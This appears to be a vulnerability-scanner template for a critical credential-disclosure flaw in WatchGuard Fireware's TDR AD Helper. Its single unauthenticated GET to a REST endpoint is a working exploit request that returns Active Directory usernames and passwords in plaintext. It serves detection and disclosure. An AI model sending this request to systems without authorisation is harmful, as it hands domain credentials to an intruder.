id: watchguard-credentials-disclosure
info:
  author: gy741
  description: A credential-disclosure vulnerability in the AD Helper component of
    the WatchGuard Fireware Threat Detection and Response (TDR) service, which allows
    unauthenticated attackers to gain Active Directory credentials for a Windows domain
    in plaintext.
  name: WatchGuard Fireware AD Helper Component - Credentials Disclosure
  reference:
  - https://www.exploit-db.com/exploits/48203
  - https://www.watchguard.com/wgrd-blog/tdr-ad-helper-credential-disclosure-vulnerability
  severity: critical
  tags: watchguard,disclosure
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"fullyQualifiedName"'
    - '"logonDomain"'
    - '"username"'
    - '"password"'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc'
